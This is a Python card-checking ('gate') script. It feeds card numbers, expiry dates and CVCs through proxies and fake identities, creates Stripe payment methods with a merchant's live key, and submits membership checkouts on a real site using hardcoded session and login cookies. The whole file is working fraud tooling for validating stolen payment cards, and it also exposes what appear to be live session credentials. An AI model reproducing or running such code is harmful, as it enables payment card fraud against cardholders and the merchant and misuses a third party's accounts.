import requests
import re
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from colorama import Fore, Style
from proxy import reqproxy

#£24.99
def fake_user():
   response = requests.get('https://randomuser.me/api/1.2/?nat=us')
   data = response.text
   name_match = re.search(r'"first":"(.*?)"', data)
   name = name_match.group(1) if name_match else ''
   last_match = re.search(r'"last":"(.*?)"', data)
   last = last_match.group(1) if last_match else ''
   email_match = re.search(r'"email":"(.*?)"', data)
   email = email_match.group(1) if email_match else ''
   street_match = re.search(r'"street":"(.*?)"', data)
   street = street_match.group(1) if street_match else ''
   city_match = re.search(r'"city":"(.*?)"', data)
   city = city_match.group(1) if city_match else ''
   state_match = re.search(r'"state":"(.*?)"', data)
   state = state_match.group(1) if state_match else ''
   phone_match = re.search(r'"phone":"(.*?)"', data)
   phone = phone_match.group(1) if phone_match else ''
   postcode_match = re.search(r'"postcode":(.*?),', data)
   postcode = postcode_match.group(1) if postcode_match else ''
   return name, last, email, street, city, state, phone, postcode

def Tele3(ccx):
    session, ip_address = reqproxy()
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")

    if "20" in yy:
        yy = yy.split("20")[1]
   
    name, last, email, street, city, state, phone, postcode = fake_user()
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not A(Brand";v="24", "Chromium";v="110"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generate_user_agent(),
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=0ed3ead2-6862-4522-94cb-374f5f846bb57c7cef&muid=9b7b94cb-e525-43dd-bbb3-8d6a9e722a83c6b1ab&sid=4392c2f7-3adc-490b-968c-ed1df5a90de50d84d3&payment_user_agent=stripe.js%2Fdf61bd3d21%3B+stripe-js-v3%2Fdf61bd3d21%3B+split-card-element&referrer=https%3A%2F%2Fmypathway.tv&time_on_page=15722&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1GeOeOHOnAue0iii'
    
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    try:
       id = response.json()['id']
       print(Fore.GREEN + "PM: ",id, "Proxy is Live: ", ip_address, "gatet3" + Style.RESET_ALL)
    except:
           return '#'


# Define the URL and headers
    url = 'https://mypathway.tv/membership-account/membership-checkout/'

    headers1 = {
        'authority': 'mypathway.tv',
        'accept': 'application/json',
        'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://mypathway.tv',
        'referer': 'https://mypathway.tv/membership-account/membership-checkout/',
        'sec-ch-ua': '"Not A(Brand";v="24", "Chromium";v="110"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generate_user_agent(),
    }
    
    data2 = {
    "AccountNumber": "XXXXXXXXXXXX1541",
    "CardType": "visa",
    "ExpirationMonth": "12",
    "ExpirationYear": "2026",
    "autorenew": "1",
    "autorenew_present": "1",
    "checkjavascript": "1",
    "discount_code": "",
    "javascriptok": "1",
    "level": "1",
    "other_discount_code": "",
    "payment_method_id": id,
    "submit-checkout": "1"
    }

    
    cookies = {
    "__stripe_mid": "9b7b94cb-e525-43dd-bbb3-8d6a9e722a83c6b1ab",
    "__stripe_sid": "4392c2f7-3adc-490b-968c-ed1df5a90de50d84d3",
    "_lscache_vary": "165044f142fb03087f2c0d33eefe4c01",
    "bpaf-default-filter": "1",
    "PHPSESSID": "b009cf5b1e04223e9b516d1ff0ae6a67",
    "pmpro_visit": "1",
    "wordpress_logged_in_829ebd761a87353ef718a0b8aecbbb2e": "thi09089098468%7C1699745862%7CANwvSLyOCLYKRWChj923XtKAXBFWt9v6hJkKi5IQc0N%7Ceb62d5f49e789874bfafc223f4f8dff88b3403ad72a88758dc35dcf0c345336d"
    }

    
   # Make the POST request
    response = session.post(url, headers=headers1, data=data2, cookies=cookies, verify=False)  # Note: Set verify=False to disable SSL verification
    try:
       result2 = response.text
    except:
	    return "succeeded"
    return result2
print("working gatet 3")
